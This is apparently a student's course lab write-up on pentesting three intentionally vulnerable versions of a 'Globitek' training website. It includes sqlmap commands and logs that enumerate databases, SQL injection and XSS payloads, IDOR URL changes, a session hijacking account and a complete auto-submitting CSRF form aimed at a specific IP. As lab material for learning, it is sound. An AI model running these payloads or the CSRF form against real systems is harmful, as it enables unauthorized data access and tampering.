# Pentester by Abstract
Week 8 Project: Pentesting Live Targets
# Project 8 - Pentesting Live Targets

Time spent: **5** hours spent in total

> Objective: Identify vulnerabilities in three different versions of the Globitek website: blue, green, and red.

The six possible exploits are:
* Username Enumeration -green-
* Insecure Direct Object Reference (IDOR) -red-
* SQL Injection (SQLi) -blue-
* Cross-Site Scripting (XSS) -green-
* Cross-Site Request Forgery (CSRF) -red-
* Session Hijacking/Fixation -blue-

Each version of the site has been given two of the six vulnerabilities. (In other words, all six of the exploits should be assignable to one of the sites.)

## Blue

Vulnerability #1: Session Hijacking/Fixation - Loaded up two seprate browser sessions (Firefox/Chrome) each had it's own session ID and of course, user Agent. Logged in as an admin in chrome and was able to access the site in Firefox without logging in by using a embeded tool hidden in the web directory that changed my session ID's value. So from here I hijacked the admin session.
<br>
<img src="https://github.com/JustenPhillips/pentester/blob/master/BlueSessionHijacking.gif">
<br>
Vulnerability #2: SQLi - I found a possible SQLi injection vulnerability when I was able to insert a single quote to escape the string input within the URI ID parameter on the salesperson.php page.
<br>
https://35.226.246.43/blue/public/salesperson.php?id=1' 
<br>
From here I was able to execute my attack. I used a tool in Kali Linux called SQLmap to find a few possible injections that would work. I will include my attack log in the Notes on the bottom of this document where I was able to enumerate all the names of all the databases and the number of columns in the table where ID is present. One injection that sqlmap found able to input was SLEEP.<br>
`' AND SLEEP(5) AND 'XnBq'='XnBq'` <br>
which is tells the database to sleep for 5 secounds and a true boolean statement.
<br>
<img src="https://github.com/JustenPhillips/pentester/blob/master/BlueSQLI.gif">
<br>

## Green

Vulnerability #1: Username Enumeration - If the username exist when inputed into the login auth form with a bad password, the login failed is returned in bold font. When a user that dosn't exist is inputed, the login error is not returned in bold.
The developer used the wrong css class "failed". To make the message bold, the class name is "failure".
<br>
<img src="https://github.com/JustenPhillips/pentester/blob/master/GreenUserNameEnum.gif">
<br>
Vulnerability #2: XSS - The user can submit feedback that when accessed from the admin side, will run code in a script tag.
`<script>alert('!Abstract!')</script>`
The other sites probably escape the strings that the users can submit feedback for.
<br>
<img src="https://github.com/JustenPhillips/pentester/blob/master/GreenXSS.gif">
<br>

## Red

Vulnerability #1:CSRF - Here we can run a script outside of the websites scope that can post or change something inside the scope of the website by using someone with admin privledges session. If someone logged in as admin was to "accedentally" run this script they could unknowingly change something. This is cross-site script forgery. Here we simulate by making a form script that auto-submits a post request onto by using our admins session. I will post the script in my notes.
<br>
<img src="https://github.com/JustenPhillips/pentester/blob/master/RedCSRF.gif">
<br>
Vulnerability #2: IDOR - On the salesperson page if you change the id of the salesperson, it will allow you to see private information or data that was not intended for the public. In Blue and Green, the private numbers will redirect you to the previous page if you try to use a private id. The availabe ID go up to 9 but if you change the parameter to.
`
https://35.226.246.43/blue/public/salesperson.php?id=10
`
or
`
https://35.226.246.43/blue/public/salesperson.php?id=11
`
you can see two hidden sales persons.
<br>
<img src="https://github.com/JustenPhillips/pentester/blob/master/RedIDOR.gif">
<br>

## Notes

## SQLMAP
Here is a write up of the steps I took to dump the database names with SQLMAP.

After discovering a exploitable query I inputed it into my command which gave me the following clues.
```
sqlmap --url https://35.226.246.43/blue/public/salesperson.php?id=1 --dbs
---
[12:59:49] [INFO] GET parameter 'id' appears to be 'AND boolean-based blind - WHERE or HAVING clause' injectable (with --code=200)
[12:59:53] [INFO] heuristic (extended) test shows that the back-end DBMS could be 'MySQL'
[13:00:15] [INFO] GET parameter 'id' appears to be 'MySQL >= 5.0.12 AND time-based blind' injectable
[13:00:24] [WARNING] if UNION based SQL injection is not detected, please consider usage of option '--union-char'
 (e.g. '--union-char=1') and/or try to force the back-end DBMS (e.g. '--dbms=mysql')
 [13:00:25] [CRITICAL] all tested parameters do not appear to be injectable. Try to increase values for '--level'/'--risk' options if you wish to perform more tests. If you suspect that there is some kind of protection mechanism involved 
 (e.g. WAF) maybe you could try to use option '--tamper' (e.g. '--tamper=space2comment')
```
 This told me that it was mysql and it wasn't accepting null char so i...
 `sqlmap --url https://35.226.246.43/blue/public/salesperson.php?id=1 --dbms=mysql union-char=1`
 
 Which returned nothing, but when I changed union-char to 5...
 
`sqlmap --url https://35.226.246.43/blue/public/salesperson.php?id=1 --union-char=5 --dbms=mysql`

which gave me a output that 'id' parameter was exploitable and...
```
sqlmap identified the following injection point(s) with a total of 60 HTTP(s) requests:

Parameter: id (GET)
    Type: boolean-based blind
    Title: AND boolean-based blind - WHERE or HAVING clause
    Payload: id=1' AND 9886=9886 AND 'GcSU'='GcSU

    Type: AND/OR time-based blind
    Title: MySQL >= 5.0.12 AND time-based blind
    Payload: id=1' AND SLEEP(5) AND 'XnBq'='XnBq

    Type: UNION query
    Title: Generic UNION query (5) - 5 columns
    Payload: id=-9253' UNION ALL SELECT 5,5,5,5,CONCAT(0x716b7a7671,0x6d4870474e616c51454c65554e7858774344576c48676f414b615077587661554d51485176756446,0x716a716271)-- HzPn

[13:03:41] [INFO] the back-end DBMS is MySQL
web server operating system: Linux Ubuntu 16.04 (xenial)
web application technology: Apache 2.4.18
back-end DBMS: MySQL >= 5.0.12
```
This told me the amount of columns in the ID table 

so i ran...
```
sqlmap --url https://35.226.246.43/blue/public/salesperson.php?id=4 --union-char=5 --dbs
---
sqlmap resumed the following injection point(s) from stored session:

Parameter: id (GET)
    Type: boolean-based blind
    Title: AND boolean-based blind - WHERE or HAVING clause
    Payload: id=4' AND 9886=9886 AND 'GcSU'='GcSU

    Type: AND/OR time-based blind
    Title: MySQL >= 5.0.12 AND time-based blind
    Payload: id=4' AND SLEEP(5) AND 'XnBq'='XnBq

    Type: UNION query
    Title: Generic UNION query (5) - 5 columns
    Payload: id=-9253' UNION ALL SELECT 5,5,5,5,CONCAT(0x716b7a7671,0x6d4870474e616c51454c65554e7858774344576c48676f414b615077587661554d51485176756446,0x716a716271)-- HzPn
    
[13:05:35] [INFO] the back-end DBMS is MySQL
web server operating system: Linux Ubuntu 16.04 (xenial)
web application technology: Apache 2.4.18
back-end DBMS: MySQL >= 5.0.12
[13:05:35] [INFO] fetching database names
[13:05:35] [INFO] used SQL query returns 7 entries
[13:05:36] [INFO] retrieved: information_schema
[13:05:36] [INFO] retrieved: globitek_blue
[13:05:36] [INFO] retrieved: globitek_green
[13:05:36] [INFO] retrieved: globitek_red
[13:05:37] [INFO] retrieved: mysql
[13:05:37] [INFO] retrieved: performance_schema
[13:05:37] [INFO] retrieved: sys
available databases [7]:
[*] globitek_blue
[*] globitek_green
[*] globitek_red
[*] information_schema
[*] mysql
[*] performance_schema
[*] sys
---
```
which dumped the names of all the available Data bases...

## CSRF Script

If a user with admin account runs this script it will do the following.
This script can be used to autosubmit a form post request that edit the data of the target saleperson on id 5.

```
<html>
  <head>
    <title>CSRF Form</title>
  </head>
  <body onload="document.edit_salesperson.submit()">
    <form action="https://35.226.246.43/red/public/staff/salespeople/edit.php?id=5" 
	method="POST" name="edit_salesperson" style="display: none;" target="hidden_results" >
      <input type="text" name="first_name" value="CROSS SITE"><br>
      <input type="text" name="last_name" value="REQUEST FORGERY"><br>
      <input type="text" name="phone" value="1337"><br>
      <input type="text" name="email" value="abstract@nowhere.omg"><br>
    </form>
   <script>document.getElementById("edit_salesperson").submit()</script>
  </body>
</html>
```

# !Abstract!
